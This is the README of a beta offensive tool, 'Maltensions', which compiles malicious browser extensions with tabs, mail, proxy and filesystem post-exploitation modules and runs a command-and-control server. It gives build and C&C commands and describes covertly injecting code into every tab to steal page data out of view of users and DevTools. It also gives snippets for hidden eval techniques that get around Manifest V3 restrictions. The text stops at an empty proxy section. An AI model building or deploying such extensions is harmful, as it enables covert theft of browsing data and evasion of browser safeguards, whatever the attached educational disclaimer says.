# Maltensions
This is A BETA-Version for Maltensions -> Post-Exploitation methods inside any .extension



## How To Install/Test?
1. Select an Post-Exploitation module (i.e: tabs / mail / proxy / fs / etc).
2. Configure Post-Exploit arguments (args like cc-server and such).
3. Inject this module as script in background context (unpacked-mode / inside other extension with xss & such).

* Compile maltension JS file with (BETA VERSION ONLY - listens over localhost:8080):
```
python3 maltension.py -m mail tabs proxy fs 
```
* Run The simple C&C Server with (for example - listens on localhost:8080):
```
python3 server.py -p8080
```

## NOTES
* The output will be in malty folder under background.js filename.
* For more arguments & explanations, place the arg "--help" and see the results.  
* Look also at the modules folder JS files - that contains the real deal kinda :)
* THIS IS BETA VERSION only - mainly focuses on showing the techniques & such... so yes yes yes - coolish bugs and such might exists inside... but you're welcome to help & continue developing this while giving proper credits & such - Thanks!!! :)
* Please run inside some sadnbox or something like that, this tool is just for educational purposes only, author is not responsible for any damage.

## LEGAL DISCLAIMER 
Usage of Maltensions Tool for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. 
Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.

*For real - this is only for educational purposes & not for harm to be done anywhere!!!


# EXTRA INFO ON MODULES & SOME REQUIREMENTS

## Background extraction
1. Main Required permissions: tabs
2. The technique: Inject dynamic code to "steal" all info and return it back to background context with messaging, that way, users and sites aren't aware of data extraction (DevTools is empty), and the background context can send this data at arbtirary times when he is choosing to.
* Example code for dynamic execution:
```
chrome.tabs.executeScript(tabId= 1000, {code:"alert()", allFrames: true})
```

* In Manifest V3: tabs, scripting. 
* Even though mv3 doesn't natively support script execution - This is manifest-v3 compatible also (using function definition).  		
* Tracking newly opened tabs:
chrome.tabs.onCreated.addListener(e=>console.log("New tab opened, ID=" + e.id + ", JSON Printing:" + JSON.stringify(e)));


## Bonus - Hidden Eval techniques for MV3:

1. Dynamic code execution from background: 
 ```
 chrome.tabs.create({active: false, 
 	'url': 'javascript:eval("alert(\\"dynamic code executed!\\")")'});
 ```

 Then, from the newly opened page - the malicious extension can then post messages back to background to call specific API's as needed.
2. Also, another way is to inject eval/other inline executionable function & then add argument for that function:

```
	function dynamicExec(code) {
		eval(code);
	}
    var results = await chrome.scripting.executeScript({
      target: {
        tabId: tab.id,
      },
      func: dynamicExec,
      args: ["alert('Dynamic code executed!');"],
    });
```


## Proxy Communication
